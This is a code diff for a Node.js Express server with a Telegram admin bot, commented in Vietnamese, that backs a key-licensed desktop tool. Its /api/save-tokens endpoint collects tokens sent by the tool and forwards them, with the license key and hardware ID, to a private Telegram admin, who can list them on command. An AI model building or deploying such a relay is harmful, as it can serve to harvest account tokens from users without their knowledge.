@@ -4,7 +4,6 @@ const TelegramBot = require('node-telegram-bot-api');
 
 const app = express();
 
-// Cấu hình CORS mở rộng: Cho phép mọi yêu cầu từ Web và File .EXE (file://, app://)
 app.use(cors({
     origin: '*',
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
@@ -19,12 +18,16 @@ const ADMIN_ID = 8377928865;
 
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
-// Khai báo biến lưu trữ tạm thời trong RAM Server
+// LẮP BỘ BẮT LỖI POLLING (Để phát hiện ngay nếu bị đụng Token/Lỗi mạng)
+bot.on('polling_error', (error) => {
+    console.error("⚠️ [LỖI BOT TELEGRAM]:", error.code, error.message);
+});
+
+// Khai báo biến lưu trữ tạm thời
 let globalTokens = [];
 let isMaintenanceMode = false;
 let maintenanceMsg = "HỆ THỐNG ĐANG BẢO TRÌ ĐỂ CẬP NHẬT!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.";
 
-// Cấu hình Thông báo Popup từ xa cho Tool
 let currentNotice = {
     active: false,
     id: "notice_v1",
@@ -33,7 +36,7 @@ let currentNotice = {
 };
 
 // ----------------------------------------------------
-// API 1: KIỂM TRA TRẠNG THÁI BẢO TRÌ VÀ THÔNG BÁO TỪ XA
+// API ENDPOINTS
 // ----------------------------------------------------
 app.get('/api/status', (req, res) => {
     return res.json({
@@ -43,9 +46,6 @@ app.get('/api/status', (req, res) => {
     });
 });
 
-// ----------------------------------------------------
-// API 2: XÁC THỰC KEY VÀ MÃ THIẾT BỊ (HWID)
-// ----------------------------------------------------
 app.get('/api/verify', (req, res) => {
     const { key, deviceId } = req.query;
 
@@ -57,7 +57,6 @@ app.get('/api/verify', (req, res) => {
         return res.json({ success: false, message: "Vui lòng nhập Key!" });
     }
 
-    // Thời gian hết hạn mặc định (24 giờ kể từ lúc đăng nhập)
     const expireAt = Date.now() + (24 * 60 * 60 * 1000);
 
     return res.json({
@@ -70,15 +69,12 @@ app.get('/api/verify', (req, res) => {
     });
 });
 
-// ----------------------------------------------------
-// API 3: NHẬN TOKEN TỪ TOOL VÀ GỬI VỀ TELEGRAM ADMIN
-// ----------------------------------------------------
 app.post('/api/save-tokens', async (req, res) => {
     try {
         const { key, deviceId, tokens } = req.body;
 
         if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
-            return res.status(400).json({ success: false, message: "Không tìm thấy token nào trong yêu cầu!" });
+            return res.status(400).json({ success: false, message: "Không tìm thấy token nào!" });
         }
 
         const validTokens = tokens.map(t => t.trim()).filter(t => t !== "");
@@ -87,10 +83,8 @@ app.post('/api/save-tokens', async (req, res) => {
             return res.status(400).json({ success: false, message: "Danh sách Token rỗng!" });
         }
 
-        // Cập nhật Token vào bộ nhớ Server
         globalTokens = validTokens;
 
-        // Gửi thông báo Token về Telegram Admin (dùng HTML mode)
         let msg = `📥 <b>NHẬN TOKEN MỚI TỪ TOOL</b>\n`;
         msg += `🔑 Key: <code>${key || 'Không có'}</code>\n`;
         msg += `📱 HWID: <code>${deviceId || 'Không có'}</code>\n`;
@@ -103,7 +97,7 @@ app.post('/api/save-tokens', async (req, res) => {
 
         await bot.sendMessage(ADMIN_ID, msg, { parse_mode: 'HTML' });
 
-        return res.json({ success: true, message: "Đã lưu và gửi Token về Bot thành công!" });
+        return res.json({ success: true, message: "Đã lưu và gửi Token thành công!" });
 
     } catch (error) {
         console.error("Lỗi xử lý /api/save-tokens:", error);
@@ -112,80 +106,91 @@ app.post('/api/save-tokens', async (req, res) => {
 });
 
 // ----------------------------------------------------
-// BOT TELEGRAM COMMANDS
+// BOT TELEGRAM COMMANDS (BỘ XỬ LÝ LỆNH TẬP TRUNG)
 // ----------------------------------------------------
 
-// Lệnh Fast Menu / Hướng dẫn
-bot.onText(/\/start|\/help/, (msg) => {
-    if (msg.from.id != ADMIN_ID) return;
-    let text = `🤖 <b>BẢNG ĐIỀU KHIỂN BOT ADMIN SENKOO</b>\n\n`;
-    text += `🔹 <b>/listtokens</b> : Xem danh sách Token vừa nhận\n`;
-    text += `🔹 <b>/baotri on</b> : Bật chế độ bảo trì (Khóa Tool)\n`;
-    text += `🔹 <b>/baotri off</b> : Tắt chế độ bảo trì (Mở Tool)\n`;
-    text += `🔹 <b>/thongbao [Nội dung]</b> : Gửi thông báo mới lên Tool\n`;
-    text += `🔹 <b>/tatthongbao</b> : Tắt bảng thông báo Popup\n`;
-    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'HTML' });
-});
+bot.on('message', async (msg) => {
+    if (!msg.text) return;
 
-// Lệnh xem danh sách Token hiện có
-bot.onText(/\/listtokens/, (msg) => {
-    if (msg.from.id != ADMIN_ID) return;
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const text = msg.text.trim();
 
-    if (globalTokens.length === 0) {
-        return bot.sendMessage(ADMIN_ID, "⚠️ Hiện chưa có Token nào trong hệ thống (Hoặc Server vừa khởi động lại).");
+    // LOG RA CONSOLE ĐỂ BẠN THEO DÕI TRÊN SERVER
+    console.log(`📩 [TIN NHẮN ĐẾN] Từ ID: ${userId} | Nội dung: "${text}"`);
+
+    // Kiểm tra quyền Admin
+    if (String(userId) !== String(ADMIN_ID)) {
+        console.log(`⛔ Khai trừ ID ${userId} do không trùng với ADMIN_ID (${ADMIN_ID})`);
+        return;
     }
 
-    let text = `📋 <b>DANH SÁCH TOKEN HIỆN CÓ (${globalTokens.length}):</b>\n\n`;
-    globalTokens.forEach((tk, i) => {
-        text += `${i + 1}. <code>${tk}</code>\n`;
-    });
-
-    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'HTML' });
-});
-
-// Lệnh bật/tắt bảo trì từ xa (/baotri on hoặc /baotri off)
-bot.onText(/\/baotri (.+)/, (msg, match) => {
-    if (msg.from.id != ADMIN_ID) return;
-    const action = match[1].toLowerCase().trim();
-
-    if (action === "on") {
-        isMaintenanceMode = true;
-        bot.sendMessage(ADMIN_ID, "🔒 Đã BẬT chế độ bảo trì. Toàn bộ Tool sẽ bị khóa!");
-    } else if (action === "off") {
-        isMaintenanceMode = false;
-        bot.sendMessage(ADMIN_ID, "🔓 Đã TẮT chế độ bảo trì. Người dùng có thể sử dụng Tool bình thường.");
+    // Lệnh: /start hoặc /help
+    if (text === '/start' || text === '/help') {
+        let helpText = `🤖 <b>BẢNG ĐIỀU KHIỂN BOT ADMIN SENKOO</b>\n\n`;
+        helpText += `🔹 <b>/listtokens</b> : Xem danh sách Token\n`;
+        helpText += `🔹 <b>/baotri on</b> : Bật bảo trì\n`;
+        helpText += `🔹 <b>/baotri off</b> : Tắt bảo trì\n`;
+        helpText += `🔹 <b>/thongbao [Nội dung]</b> : Bật Popup thông báo trên Tool\n`;
+        helpText += `🔹 <b>/tatthongbao</b> : Tắt Popup thông báo\n`;
+        return bot.sendMessage(chatId, helpText, { parse_mode: 'HTML' });
     }
-});
 
-// Lệnh gửi thông báo tới Tool (Hỗ trợ tin nhắn nhiều dòng)
-bot.onText(/\/thongbao\s+([\s\S]+)/, (msg, match) => {
-    if (msg.from.id != ADMIN_ID) return;
-    const noticeContent = match[1].trim();
+    // Lệnh: /listtokens
+    if (text === '/listtokens') {
+        if (globalTokens.length === 0) {
+            return bot.sendMessage(chatId, "⚠️ Hiện chưa có Token nào trong hệ thống.");
+        }
+        let listText = `📋 <b>DANH SÁCH TOKEN HIỆN CÓ (${globalTokens.length}):</b>\n\n`;
+        globalTokens.forEach((tk, i) => {
+            listText += `${i + 1}. <code>${tk}</code>\n`;
+        });
+        return bot.sendMessage(chatId, listText, { parse_mode: 'HTML' });
+    }
 
-    currentNotice = {
-        active: true,
-        id: "notice_" + Date.now(), // Đổi ID theo thời gian để kích hoạt Popup ở lần mở ứng dụng tiếp theo
-        title: "📢 THÔNG BÁO TỪ HỆ THỐNG",
-        message: noticeContent
-    };
+    // Lệnh: /baotri on hoặc /baotri off
+    if (text.startsWith('/baotri')) {
+        const action = text.replace('/baotri', '').trim().toLowerCase();
+        if (action === 'on') {
+            isMaintenanceMode = true;
+            return bot.sendMessage(chatId, "🔒 Đã <b>BẬT</b> chế độ bảo trì. Tool đã bị khóa!", { parse_mode: 'HTML' });
+        } else if (action === 'off') {
+            isMaintenanceMode = false;
+            return bot.sendMessage(chatId, "🔓 Đã <b>TẮT</b> chế độ bảo trì. Tool hoạt động bình thường!", { parse_mode: 'HTML' });
+        } else {
+            return bot.sendMessage(chatId, "⚠️ Cú pháp sai! Dùng: <code>/baotri on</code> hoặc <code>/baotri off</code>", { parse_mode: 'HTML' });
+        }
+    }
 
-    bot.sendMessage(ADMIN_ID, `✅ **Đã bật thông báo mới lên Tool:**\n\n💬 ${noticeContent}`, { parse_mode: 'HTML' });
-});
+    // Lệnh: /thongbao [Nội dung]
+    if (text.startsWith('/thongbao')) {
+        const noticeContent = text.replace('/thongbao', '').trim();
 
-// Nhắc nhở nếu gõ thiếu nội dung thông báo
-bot.onText(/\/thongbao$/, (msg) => {
-    if (msg.from.id != ADMIN_ID) return;
-    bot.sendMessage(ADMIN_ID, "⚠️ **Cú pháp chưa đúng!**\nVui lòng gõ: `/thongbao [Nội dung thông báo]`", { parse_mode: 'Markdown' });
-});
+        if (!noticeContent) {
+            return bot.sendMessage(chatId, "⚠️ <b>Thiếu nội dung thông báo!</b>\n\n👉 Cú pháp đúng: <code>/thongbao Nội dung cần gửi</code>", { parse_mode: 'HTML' });
+        }
 
-// Lệnh tắt thông báo Popup (/tatthongbao)
-bot.onText(/\/tatthongbao/, (msg) => {
-    if (msg.from.id != ADMIN_ID) return;
-    currentNotice.active = false;
-    bot.sendMessage(ADMIN_ID, "❌ Đã TẮT bảng thông báo Popup trên Tool!");
+        currentNotice = {
+            active: true,
+            id: "notice_" + Date.now(),
+            title: "📢 THÔNG BÁO TỪ HỆ THỐNG",
+            message: noticeContent
+        };
+
+        return bot.sendMessage(chatId, `✅ <b>Đã bật thông báo mới lên Tool:</b>\n\n💬 ${noticeContent}`, { parse_mode: 'HTML' });
+    }
+
+    // Lệnh: /tatthongbao
+    if (text === '/tatthongbao') {
+        currentNotice.active = false;
+        return bot.sendMessage(chatId, "❌ Đã <b>TẮT</b> thông báo Popup trên Tool!", { parse_mode: 'HTML' });
+    }
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Server đang chạy tại Cổng ${PORT}...`);
+    console.log(`=================================`);
+    console.log(`Server đang chạy tại Cổng ${PORT}`);
+    console.log(`ADMIN_ID đang cấu hình là: ${ADMIN_ID}`);
+    console.log(`=================================`);
 });
